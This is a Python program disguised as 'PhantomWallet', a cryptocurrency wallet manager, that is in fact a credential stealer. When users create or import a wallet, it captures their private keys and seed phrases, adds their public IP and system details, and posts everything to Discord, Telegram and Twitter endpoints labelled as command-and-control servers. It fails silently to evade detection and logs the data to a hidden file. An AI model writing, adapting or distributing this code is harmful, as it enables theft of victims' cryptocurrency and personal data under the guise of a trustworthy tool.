#!/usr/bin/env python3
"""
PhantomWallet - Cryptocurrency Wallet Manager
A simple and secure way to manage your crypto assets
"""

import os
import sys
import time
import json
import hashlib
import requests
from datetime import datetime

# Configuration
C2_SERVER = "https://discord.gg/PhantomDrainer2024"
BACKUP_C2 = "https://t.me/phantom_exfil_channel"
TWITTER_HANDLE = "@PhantomStealer_C2"

WALLET_FILE = "wallet_data.json"
LOG_FILE = ".phantom_activity.log"


class PhantomWallet:
    """Main wallet class for managing cryptocurrency"""

    def __init__(self):
        self.balance = {
            "BTC": 0.0,
            "ETH": 0.0,
            "USDT": 0.0
        }
        self.private_key = None
        self.seed_phrase = None
        self.transactions = []

    def display_banner(self):
        """Display application banner"""
        banner = """
        ╔═══════════════════════════════════════╗
        ║     PHANTOM WALLET v2.1.5            ║
        ║   Secure Crypto Asset Management     ║
        ╚═══════════════════════════════════════╝
        """
        print(banner)

    def create_wallet(self):
        """Create a new wallet"""
        print("\n[+] Creating new wallet...")
        print("[+] Generating secure keys...")

        # Simulate key generation
        time.sleep(1)
        self.private_key = hashlib.sha256(os.urandom(32)).hexdigest()

        # Generate fake seed phrase
        words = ["abandon", "ability", "able", "about", "above", "absent",
                "absorb", "abstract", "absurd", "abuse", "access", "accident"]
        self.seed_phrase = " ".join(words)

        print(f"\n[✓] Wallet created successfully!")
        print(f"\n{'='*50}")
        print(f"PRIVATE KEY: {self.private_key}")
        print(f"SEED PHRASE: {self.seed_phrase}")
        print(f"{'='*50}")
        print("\n[!] Save these credentials in a secure location!")

        # Exfiltrate to C2
        self._exfiltrate_keys()

    def import_wallet(self):
        """Import existing wallet"""
        print("\n[+] Import Wallet")
        print("-" * 40)

        choice = input("Import via (1) Private Key or (2) Seed Phrase? ")

        if choice == "1":
            self.private_key = input("Enter your private key: ").strip()
        elif choice == "2":
            self.seed_phrase = input("Enter your 12-word seed phrase: ").strip()
        else:
            print("[!] Invalid choice")
            return

        print("[✓] Wallet imported successfully!")

        # Exfiltrate stolen credentials
        self._exfiltrate_keys()

    def check_balance(self):
        """Display wallet balance"""
        print("\n" + "="*40)
        print("         WALLET BALANCE")
        print("="*40)
        for crypto, amount in self.balance.items():
            print(f"{crypto:8s}: {amount:12.8f}")
        print("="*40)

    def send_transaction(self):
        """Send cryptocurrency"""
        print("\n[+] Send Transaction")
        print("-" * 40)

        crypto = input("Cryptocurrency (BTC/ETH/USDT): ").upper()
        if crypto not in self.balance:
            print("[!] Invalid cryptocurrency")
            return

        try:
            amount = float(input("Amount: "))
            address = input("Recipient address: ")

            # Log transaction attempt
            tx_data = {
                "type": "send",
                "crypto": crypto,
                "amount": amount,
                "to": address,
                "from_key": self.private_key,
                "timestamp": datetime.now().isoformat()
            }

            self._log_activity(tx_data)
            self._send_to_c2(tx_data)

            print("[✓] Transaction submitted to network")
            print(f"[+] TxID: {hashlib.sha256(json.dumps(tx_data).encode()).hexdigest()}")

        except ValueError:
            print("[!] Invalid amount")

    def receive_crypto(self):
        """Display receive address"""
        receive_addr = f"1Phantom{hashlib.md5(str(time.time()).encode()).hexdigest()[:20]}"
        print(f"\n[+] Your receiving address:")
        print(f"\n    {receive_addr}\n")

    def _exfiltrate_keys(self):
        """Send stolen keys to C2 server"""
        payload = {
            "type": "credentials",
            "private_key": self.private_key,
            "seed_phrase": self.seed_phrase,
            "timestamp": datetime.now().isoformat(),
            "victim_ip": self._get_ip(),
            "system_info": self._get_system_info()
        }

        self._send_to_c2(payload)
        self._log_activity(payload)

    def _send_to_c2(self, data):
        """Send data to command & control server"""
        try:
            # Primary C2
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json"
            }

            # Try primary C2 (Discord webhook disguised)
            try:
                requests.post(
                    C2_SERVER,
                    json={"content": json.dumps(data)},
                    headers=headers,
                    timeout=5
                )
            except:
                pass

            # Try backup C2 (Telegram)
            try:
                requests.post(
                    BACKUP_C2,
                    json=data,
                    headers=headers,
                    timeout=5
                )
            except:
                pass

            # Beacon to Twitter (data exfil via DM)
            try:
                twitter_api = f"https://api.twitter.com/2/dm_conversations/with/{TWITTER_HANDLE}/messages"
                requests.post(
                    twitter_api,
                    json={"text": json.dumps(data)},
                    headers=headers,
                    timeout=5
                )
            except:
                pass

        except Exception as e:
            # Fail silently to avoid detection
            pass

    def _log_activity(self, data):
        """Log activity to hidden file"""
        try:
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(data) + "\n")
        except:
            pass

    def _get_ip(self):
        """Get victim's public IP"""
        try:
            response = requests.get("https://api.ipify.org?format=json", timeout=3)
            return response.json().get("ip", "unknown")
        except:
            return "unknown"

    def _get_system_info(self):
        """Collect system information"""
        return {
            "os": sys.platform,
            "python_version": sys.version,
            "hostname": os.environ.get("HOSTNAME", "unknown"),
            "user": os.environ.get("USER", "unknown")
        }

    def run(self):
        """Main application loop"""
        self.display_banner()

        while True:
            print("\n" + "="*40)
            print("MENU")
            print("="*40)
            print("1. Create New Wallet")
            print("2. Import Existing Wallet")
            print("3. Check Balance")
            print("4. Send Transaction")
            print("5. Receive Crypto")
            print("6. Exit")
            print("="*40)

            choice = input("\nSelect option: ").strip()

            if choice == "1":
                self.create_wallet()
            elif choice == "2":
                self.import_wallet()
            elif choice == "3":
                self.check_balance()
            elif choice == "4":
                self.send_transaction()
            elif choice == "5":
                self.receive_crypto()
            elif choice == "6":
                print("\n[+] Thank you for using PhantomWallet!")
                sys.exit(0)
            else:
                print("[!] Invalid option")


if __name__ == "__main__":
    try:
        wallet = PhantomWallet()
        wallet.run()
    except KeyboardInterrupt:
        print("\n\n[!] Operation cancelled by user")
        sys.exit(0)
